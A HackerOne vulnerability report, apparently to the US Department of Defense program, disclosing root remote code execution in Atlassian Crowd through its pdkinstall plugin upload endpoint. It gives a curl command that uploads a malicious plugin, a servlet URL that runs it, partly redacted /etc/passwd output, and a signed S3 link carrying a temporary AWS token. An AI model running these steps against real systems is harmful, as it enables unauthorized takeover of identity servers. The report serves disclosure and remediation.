Attackers who can send unauthenticated or authenticated requests to a Crowd or Crowd Data Center instance can exploit this vulnerability to install arbitrary plugins, which permits remote code execution on systems running a vulnerable version of Crowd or Crowd Data Center.\n\nThere is no public proof-of-concept for this vulnerability, however, I spent a good amount of time reverse-engineering the \"pdkinstall\" plugin and I was able to successfully construct a working exploit.\n\n## Step-by-step Reproduction Instructions\n\n1. Download and unzip my malicious plugin: rce-plugin.zip {F519371}\n2. `cd` into the directory\n3. Run the following command:\n```\ncurl -k -H \"Content-Type: multipart/content\" \\\n  --form \"file_cdl=@rce.jar;type=application/octet-stream\" https://███/crowd/admin/uploadplugin.action\n```\n\nYou'll see that the malicious plugin is successfully installed:\n\n```\nInstalled plugin /opt/atlassian/crowd/apache-tomcat/temp/plugindev-2906099909159442588rce.jar\n```\n\nNow visit https://███████/crowd/plugins/servlet/hackerone-cdl which invokes my malicious plugin. This executes the command `whoami` which is the user `root`\n\n██████████\n\ncontents of `/etc/passwd`\n\n```\nroot:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\n████████x:6:0:██████████/sbin:/sbin/shutdown\n██████x:7:0:███████/sbin:/sbin/halt\n█████████x:8:12:█████/var/spool/████/sbin/nologin\n███x:10:14:███/var/spool/███████/sbin/nologin\n██████x:11:0:██████/root:/sbin/nologin\n██████████x:12:100:███████/usr/████/sbin/nologin\n██████████x:13:30:█████/var/█████/sbin/nologin\n████x:14:50:FTP User:/var/███████/sbin/nologin\n█████████x:99:99:Nobody:/:/sbin/nologin\n██████████x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin\n██████████x:38:38::/etc/██████/sbin/nologin\n██████████x:499:76:\"Saslauthd user\":/var/empty/██████████/sbin/nologin\n██████████x:47:47::/var/spool/mqueue:/sbin/nologin\n███████x:51:51::/var/spool/mqueue:/sbin/nologin\n████████x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin\n█████x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin\n████████x:74:74:Privilege-separated SSH:/var/empty/████████/sbin/nologin\n████████x:81:81:System message bus:/:/sbin/nologin\n███████x:500:500:EC2 Default User:/home/████████/bin/bash\n```\n\n## Product, Version, and Configuration (If applicable)\n```\nCrowd or Crowd Data Center from version 2.1.0 before 3.0.5 (the fixed version for 3.0.x)\nCrowd or Crowd Data Center from version 3.1.0 before 3.1.6 (the fixed version for 3.1.x)\nCrowd or Crowd Data Center from version 3.2.0 before 3.2.8 (the fixed version for 3.2.x)\nCrowd or Crowd Data Center from version 3.3.0 before 3.3.5 (the fixed version for 3.3.x)\nCrowd or Crowd Data Center from version 3.4.0 before 3.4.4 (the fixed version for 3.4.x)\n```\n\n## Suggested Mitigation/Remediation Actions\nI recommend updating to the latest version of Atlassian Crowd, but if that's not possible, follow mitigation options in the advisory.\n\n## Impact\n\nRemote code execution on https://███. An attacker could exploit this vulnerability to pivot into NIPRNet and gain access to other applications. Since Atlassian Crowd is an Identity management / Single Sign-on application, an attacker could exploit this vulnerability to gain access to any applications using Crowd for sign-ons. \n\n\nSince this is running as root, an attacker could also easily backdoor the login page and steal credentials.\n\nThanks,\nCorben Leo (@cdl)","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":519371,"file_name":"rce-plugin.zip","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/519/371/4446d8ce6ac2802450871abff8a585b2713d6489/rce-plugin.zip?response-content-disposition=attachment%3B%20filename%3D%22rce-plugin.zip%22%3B%20filename%2A%3DUTF-8%27%27rce-plugin.zip\u0026response-content-type=application%2Fzip\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZ6XJQAFX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151344Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICOXvTwruabcCgvIvFwMLdD63I7wJU77da1qgiZ0fcgxAiEA2iE07eZZp56fgfdC8AqwOSxwRZmRPTllfbb0Tbxm9MYqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDDj8b5u85%2FF%2BsdTPzirXA4Q26F09GEsezqo%2FDgU%2BN1ov6Z0mJp8NxapcqVf3Oua4oSgb5aQpGLsAXhdiEaUoWsXCtHv4ujnK6mqk7E9O2WKXNjLPpfRYiEQ71CFLUQhpz1VlTUi8AaLKGm2tOz7W6Dg1b3xxjZfihfmfR6OPDce2Z600EmMbP%2BHpciOGhSEuGzpexDOGRgw4ix10R9155b0anW3PU4UD8Ge2PEqMj3%2FF8sUIZw7AbQUjqw1Ce9mhpbUZZfOQoy0pJ2t8c2T4BgwOhgN1b3fN5pnsElvfIuzUPOy6b490pAv%2BCqmrijPnhfxCFLh0JKO8JRVj8XuMyTl5hv6jZDQVsJsMAcXPrqar7TkmvMjkI%2BN4yDBkbH5NrA1VDNa0of9Y0Ob501UWmq3Ap93egI9bfOc0SJJuPizy58SnDrtHr6nSjyefAjpNL04P0FK2SzeJsSTTwhywI6YMiTBjKrFeC2gfVf8aFUGCIZ5qqWFJVDfVcx%2Fn8CXnNOSFJ4E0AOZCD2bzMOr0zl8cL%2FhRzxRrehVzw%2FTkoxOt0l7KmRzdTPKmnS8oozD2Cyle0v45%2B7sfTk9r6klH%2F2VLwfVaCQMt2wCz6DqzbD4MYWDvCaIbvvrbK5sZIedyaPkbcLAvRDDCjpGLBjqlAU9SRSSUKO2aO0kQO%2BnmnceQh7DtfcGkOUk0CXICIwNK0fD%2BqaMjTEwcyVBBW5oqUBOFZj7aKeXh%2FN47wB%2B%2BNyAlnunaZYfVUOsQGCMywCeVElq5cKhikJpo4VRBfaWxpOo%2Fjfp%2BVIoSdni5MQ6uLsqSIiA%2Fcm2GDHTprLxSZr5sstp5PxiiN53WteMJJW5bqZgjokn7B89wleOrzCJV84UVJ4OV7g%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=c9cc5e317d81afb9cc470c9b1cc2c505a1da5e02aa049e8919ddcca472ad7468","file_size":5583,"type":"application/zip"}],"allow_singular_disclosure_at":null,"vote_count":7,"voters":["pomme","mik317","brodie_codie","domssilva","05bs001","intx0x80","seven6"],"severity":{"rating":"critical","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":5222835,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2019-06-30T03:11:54.962Z","updated_at":"2019-09-24T14:10:40.289Z","additional_data":{"old_title":"Remote Code Execution as root on https://█████████","new_title":"Root Remote Code Execution on https://█████████"},"actor":{"username":"cdl","cleared":true,"url":"/cdl","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/m967ScFufJoq7HwshTaonFwq/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5228752,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2019-07-01T11:44:33.125Z","updated_at":"2019-07-01T11:44:33.125Z","additional_data":{"old_severity":null,"new_severity":"Critical","old_severity_id":null,"new_severity_id":448085},"actor":{"username":"w0lv3rin3","cleared":false,"url":"/w0lv3rin3","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/188/435/4c70234237da54fc2eac6227ebb622ebed77eece_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5228754,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Greetings,\n\nWe have validated the vulnerability you reported and are preparing to forward this report to the affected DoD system owner for resolution.\n\nThank you for bringing this vulnerability to our attention!\n\nWe will endeavor to answer any questions the system owners may have regarding this report; however, there is a possibility we will need to contact you if they require more information to resolve the vulnerability.\n\nYou will receive another status update after we have confirmed your report has been resolved by the system owner.
